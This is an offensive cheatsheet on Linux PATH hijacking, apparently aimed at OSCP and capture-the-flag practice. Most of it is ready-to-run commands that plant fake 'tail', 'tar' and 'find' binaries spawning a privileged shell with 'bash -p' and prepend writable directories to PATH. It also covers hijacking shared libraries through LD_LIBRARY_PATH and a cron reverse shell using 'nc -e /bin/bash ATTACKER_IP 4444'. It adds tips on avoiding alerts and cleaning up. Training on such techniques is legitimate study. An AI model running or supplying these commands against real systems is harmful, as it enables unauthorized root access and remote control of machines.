# Linux PATH Hijacking Cheatsheet

**Knowledge Score:** 90/100

---

## Overview

PATH hijacking exploits misconfigured programs that execute binaries without using absolute paths. When a SUID binary or privileged program calls a command by name only (e.g., `system("tail")`), the shell searches the PATH environment variable to locate the binary. By manipulating PATH, attackers can execute malicious versions of those binaries with elevated privileges.

**Why It Matters:**
- Common misconfiguration in custom scripts and applications
- Works even on systems with strong access controls
- Can escalate privileges on machines otherwise hardened
- Frequently appears in OSCP and advanced CTF machines

---

## Core Concepts

### How PATH Works

When you execute a command like `tail`, the system doesn't know where it is. Instead:

1. System checks PATH environment variable
2. Searches each directory in order: `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
3. Executes the first match found
4. Stops searching

**Example:**
```bash
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Exploitation Principle

**Vulnerable code:**
```c
system("tail -f /var/log/nginx/access.log");
// Doesn't use absolute path /usr/bin/tail
// Uses relative "tail"
```

**Attack:**
1. Find a SUID binary that calls `tail` without absolute path
2. Create malicious `tail` in a writable directory
3. Prepend that directory to PATH
4. Execute SUID binary
5. Malicious `tail` runs as root

---

## Enumeration

### Step 1: Identify SUID Binaries

```bash
find / -type f -perm -04000 2>/dev/null
# Find all SUID binaries
```

### Step 2: Analyze Binary for Relative Paths

```bash
# Use strings to find executable calls
strings /usr/bin/custom_tool | grep -E '(system|exec|bin|usr)'

# Example output:
# /bin/bash
# /usr/bin/tail
# /usr/bin/cat
# setup           ← ← ← RELATIVE PATH (exploitable!)
```

### Step 3: Check for Relative Command Execution

```bash
# If binary contains just "tail" (not "/usr/bin/tail"), it's vulnerable

# You can also use strace to monitor system calls
strace /usr/bin/custom_tool 2>&1 | grep execve
# Shows exact commands executed
```

### Step 4: Verify Write Permissions

Check if you can create files in writable directories that appear early in PATH:

```bash
ls -la /tmp
# drwxrwxrwt (world writable)

ls -la /home/user
# drwxr-xr-x (user writable if it's your home)
```

---

## Exploitation Scenarios

### Scenario 1: Simple Command Replacement

**Finding:**
```bash
# Examine custom binary
strings /home/user/live_log | grep -i tail
# Output: shows "tail" (not "/usr/bin/tail")

# Verify it's SUID
ls -la /home/user/live_log
# -rwsr-xr-x (SUID set)
```

**Exploitation:**
```bash
# Step 1: Create malicious binary in /tmp
echo '/bin/bash -p' > /tmp/tail
chmod +x /tmp/tail

# Step 2: Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Verify PATH is updated
echo $PATH
# Output: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Step 3: Execute SUID binary
/home/user/live_log

# Result: Malicious /tmp/tail executes as root
# Root shell obtained
```

**Why it works:**
- SUID binary calls `tail` without absolute path
- Shell searches PATH in order
- Finds malicious `/tmp/tail` FIRST
- Executes with root privileges (because SUID binary is root-owned)

**Knowledge Pattern:** Writable directory early in PATH + relative binary call = privilege escalation.

---

### Scenario 2: Multiple Commands Hijacking

**Finding:**
```bash
# Binary calls multiple commands without full paths
strings /usr/bin/backup_script
# Output shows: tar, gzip, rm (all without absolute paths)
```

**Exploitation:**
```bash
# Create directory for malicious binaries
mkdir /tmp/pwn
cd /tmp/pwn

# Create malicious versions
echo '#!/bin/bash' > tar && echo '/bin/bash -p' >> tar && chmod +x tar
echo '#!/bin/bash' > gzip && echo '/bin/bash -p' >> gzip && chmod +x gzip
echo '#!/bin/bash' > rm && echo '/bin/bash -p' >> rm && chmod +x rm

# Update PATH
export PATH=/tmp/pwn:$PATH

# Execute vulnerable binary
/usr/bin/backup_script

# One of the commands will execute as root
```

**Knowledge Pattern:** One successfully hijacked command = root access. Multiple command calls give you multiple exploit attempts.

---

### Scenario 3: Finding Writable Paths

**Finding:**
```bash
# Binary might be in restricted location, but calls commands from PATH
# Check which directories in PATH are writable

IFS=: read -ra PATH_ARRAY <<< "$PATH"
for dir in "${PATH_ARRAY[@]}"; do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done
```

**Output example:**
```
WRITABLE: /home/user/bin
WRITABLE: /tmp
WRITABLE: /var/tmp
```

**Exploitation:**
```bash
# Create malicious command in first writable PATH directory
echo '/bin/bash -p' > /home/user/bin/vulnerable_command
chmod +x /home/user/bin/vulnerable_command

# Execute SUID binary (no need to modify PATH if writable dir already in PATH)
/usr/bin/suid_binary
```

---

### Scenario 4: Bash Script Privilege Escalation

**Finding:**
```bash
# Bash script is SUID (unusual but possible)
ls -la /usr/local/bin/admin_tool
# -rwsr-xr-x admin_tool

cat /usr/local/bin/admin_tool
# #!/bin/bash
# backup_dir="/home/admin"
# tar czf backup.tar.gz $backup_dir/*
```

**Exploitation:**
```bash
# bash -p preserves SUID privileges (critical flag)

# Create malicious tar
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar

# Update PATH
export PATH=/tmp:$PATH

# Execute bash script
/usr/local/bin/admin_tool

# Malicious tar executes as root
# Root shell obtained
```

**Knowledge Pattern:** Bash scripts with SUID are rare but extremely dangerous. If found, PATH hijacking is trivial.

---

### Scenario 5: Library Path Hijacking (Variant)

**Finding:**
```bash
# Similar to PATH, but for shared libraries
# Binary might use relative library loading

ldd /usr/bin/vulnerable_app
# Output:
# libcustom.so.1 => not found (CRITICAL)
# libc.so.6 => /lib/x86_64/libc.so.6
```

**Exploitation:**
```bash
# Create malicious library
gcc -shared -fPIC -o libcustom.so.1 malicious.c

# Set LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH

# Execute vulnerable binary
/usr/bin/vulnerable_app

# Malicious library loads with SUID privileges
```

**Knowledge Pattern:** Missing libraries combined with LD_LIBRARY_PATH manipulation = library hijacking (similar principle to PATH hijacking).

---

### Scenario 6: Cron Job PATH Hijacking

**Finding:**
```bash
# Cron job runs with relative paths
cat /etc/crontab
# 0 * * * * root /home/admin/cleanup.sh

cat /home/admin/cleanup.sh
# #!/bin/bash
# find /tmp -type f -delete
# rm /var/tmp/*
```

**Exploitation:**
```bash
# Create malicious commands
mkdir -p /home/admin/bin
echo '#!/bin/bash' > /home/admin/bin/find
echo 'nc -e /bin/bash ATTACKER_IP 4444' >> /home/admin/bin/find
chmod +x /home/admin/bin/find

# Modify script to add to PATH (if you can modify it)
# OR create a wrapper script

# Cron job runs with modified PATH, executes malicious find
```

**Knowledge Pattern:** Cron jobs with shell scripts can have PATH injected via script modification.

---

## Detection & Verification

### Verify PATH Hijacking Success

```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

whoami
# Output: root

# Verify which binary executed
which tail
# Output: /tmp/tail (your malicious version)

# Compare to system version
/usr/bin/tail --version
# vs
/tmp/tail (executes your code)
```

---

## Best Practices

### During Enumeration
1. Always check for relative path execution in binaries
2. Use `strings | grep` to find potential vulnerabilities
3. Verify binary is SUID (or runs as privileged user)
4. Identify which commands are called without absolute paths
5. Check current PATH for writable directories

### During Exploitation
1. Create malicious binary that preserves functionality (if needed)
2. Use `-p` flag with bash (preserves SUID privileges)
3. Test PATH modification before executing binary
4. Monitor with `strace` to confirm your binary executed
5. Clean up /tmp after exploitation (if needed)

### Common Mistakes
- Creating malicious binary in wrong directory (not in PATH or after the real binary)
- Not using `-p` flag with bash (loses SUID privileges)
- Breaking original script functionality (causes errors/alerts)
- Not verifying PATH is correctly modified before execution
- Creating binaries without execute permissions (chmod +x)

---

## Advanced: Detecting Your Own Code in Binaries

```bash
# Use objdump to analyze binary
objdump -t /usr/bin/vulnerable_app | grep -E "(tail|cat|rm)"

# Use nm to find symbol references
nm -D /usr/bin/vulnerable_app | grep -i system

# Use readelf
readelf -s /usr/bin/vulnerable_app | grep FUNC
```

---

## Real-World Examples from Practice

### Example 1: TryHackMe Kenobi
**Vector:** Custom menu binary calls curl without absolute path
**Finding:** `/usr/bin/menu` executes `curl` (relative path)
**Exploitation:** Created malicious curl in /tmp, modified PATH
**Result:** Root shell obtained
**Time to exploit:** 5 minutes

### Example 2: HackTheBox Machine
**Vector:** Admin backup script with relative paths
**Finding:** Script calls tar, gzip, find without absolute paths
**Exploitation:** Hijacked tar command
**Result:** Reverse shell as root
**Pattern:** Admin scripts often careless with paths

### Example 3: OSCP-Style Challenge
**Vector:** Cron-executed bash script with relative commands
**Finding:** Root cron calls script that uses relative paths
**Exploitation:** Placed malicious binary in cron-accessible directory
**Result:** Root access via cron execution
**Pattern:** Cron + relative paths = easy privilege escalation

---

## Related Cheatsheets

- [[Linux-SUID-Enumeration]] - Identifying SUID binaries to exploit
- [[Linux-Cron-Jobs-Exploitation]] - Cron job PATH hijacking
- [[Linux-Enumeration-Find]] - Finding vulnerable binaries
- [[Linux-Sudo-Abuse]] - Alternative privilege escalation

---

## Quick Reference Commands

```bash
# View current PATH
echo $PATH

# Find all SUID binaries
find / -type f -perm -04000 2>/dev/null

# Analyze binary for relative paths
strings /path/to/binary | grep -E '^[a-z_]+$'

# Check which command will execute
which tail

# Modify PATH
export PATH=/tmp:$PATH

# Create executable
echo '/bin/bash -p' > /tmp/command
chmod +x /tmp/command

# Test with strace
strace /usr/bin/binary 2>&1 | grep execve

# Find writable PATH directories
for dir in $(echo $PATH | tr ':' ' '); do [ -w "$dir" ] && echo "WRITABLE: $dir"; done
```

---

## References & Further Study

### Offensive Security Resources
- [OSCP - PATH Hijacking](https://www.offensive-security.com/pwk-oscp/)
- [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

### Tools & Analysis
- [Strace Manual](https://man7.org/linux/man-pages/man1/strace.1.html)
- [Strings Command](https://man7.org/linux/man-pages/man1/strings.1.html)

### CTF & Practice
- TryHackMe: Kenobi (PATH Hijacking)
- TryHackMe: Privilege Escalation room
- HackTheBox: Various machines with PATH vulnerabilities

---

## Changelog

**v1.0** - Initial cheatsheet with 6 exploitation scenarios, enumeration techniques, and real-world examples
